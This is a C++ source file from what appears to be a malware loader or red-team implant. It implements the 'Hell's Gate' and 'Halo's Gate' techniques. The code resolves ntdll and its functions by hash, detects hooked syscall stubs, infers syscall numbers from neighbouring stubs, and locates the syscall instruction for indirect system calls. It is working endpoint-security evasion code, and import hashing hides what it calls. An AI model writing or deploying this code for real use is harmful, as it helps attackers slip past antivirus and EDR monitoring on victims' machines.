#include "Core/syscalls.h"
#include "Core/api_resolve.h"
#include "Crypto/hashing.h"
#include <windows.h>


DWORD wSystemCall = 0;
PVOID pSyscallAddress = NULL;

// return the pointer to syscall instruction (0x0F 0x05) or NULL.
inline PVOID FindSyscallInstruction(unsigned char* pBytes, int searchLimit) {
    for (int i = 0; i < searchLimit; i++) {
        if (pBytes[i] == 0x0F && pBytes[i + 1] == 0x05) {
            return &pBytes[i];
        }
    }
    return NULL;
}

// Check for common hook signatures at a function entry
inline bool IsHooked(unsigned char* pBytes) {
    return (pBytes[0] == 0xE9 ||  // jmp near (5-byte)
            pBytes[0] == 0xEB ||  // jmp short (2-byte)
            pBytes[0] == 0xCC);   // int3 breakpoint
}

SYSCALL_GATE GetSSNByHash(QWORD qFunctionHash) {
    SYSCALL_GATE gate = { 0 };
    
    //Find NTDLL
    HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(0X571A46A16587BB7A);
    if (!hNtdll) return gate;

    //Read PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDosHeader->e_lfanew);
    
    // Resolve .text section boundaries for safe neighbor scanning
    DWORD_PTR textBase = 0;
    DWORD_PTR textEnd = 0;
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_CNT_CODE) {
            textBase = (DWORD_PTR)hNtdll + pSection[i].VirtualAddress;
            textEnd = textBase + pSection[i].Misc.VirtualSize;
            break;
        }
    }

    // Fallback to full image if .text not found
    if (textBase == 0) {
        textBase = (DWORD_PTR)hNtdll;
        textEnd = textBase + pNtHeaders->OptionalHeader.SizeOfImage;
    }

    //Find function
    gate.pAddress = GetProcAddressByHash(hNtdll, qFunctionHash);
    if (!gate.pAddress) return gate;

    unsigned char* pBytes = (unsigned char*)gate.pAddress;

    //HELLS GATE approach - check for clean syscall stub
    if (pBytes[0] == 0x4c && pBytes[1] == 0x8b && pBytes[2] == 0xd1 && pBytes[3] == 0xb8) {
        gate.wServiceId = *(WORD*)(pBytes + 4);
        gate.pSyscallAddr = FindSyscallInstruction(pBytes, 64);
        if (gate.pSyscallAddr) return gate;
    }

    // HALOS GATE - scan neighbors if current stub is hooked
    for (WORD i = 1; i < 500; i++) {
        unsigned char* pNext = pBytes + (i * 32);
        unsigned char* pPrev = pBytes - (i * 32);

        // Validate against .text section boundaries
        bool canCheckNext = ((DWORD_PTR)pNext >= textBase) && ((DWORD_PTR)pNext + 64) < textEnd;
        bool canCheckPrev = ((DWORD_PTR)pPrev >= textBase) && ((DWORD_PTR)pPrev + 64) < textEnd;

        // Check next neighbor (skip if hooked)
        if (canCheckNext && !IsHooked(pNext) && pNext[0] == 0x4c && pNext[1] == 0x8b && pNext[2] == 0xd1 && pNext[3] == 0xb8) {
            gate.wServiceId = *(WORD*)(pNext + 4) - i;
            gate.pSyscallAddr = FindSyscallInstruction(pNext, 64);
            if (gate.pSyscallAddr) return gate;
        }

        // Check previous neighbor (skip if hooked)
        if (canCheckPrev && !IsHooked(pPrev) && pPrev[0] == 0x4c && pPrev[1] == 0x8b && pPrev[2] == 0xd1 && pPrev[3] == 0xb8) {
            gate.wServiceId = *(WORD*)(pPrev + 4) + i;
            gate.pSyscallAddr = FindSyscallInstruction(pPrev, 64);
            if (gate.pSyscallAddr) return gate;
        }
    }  
    
    return gate;
}
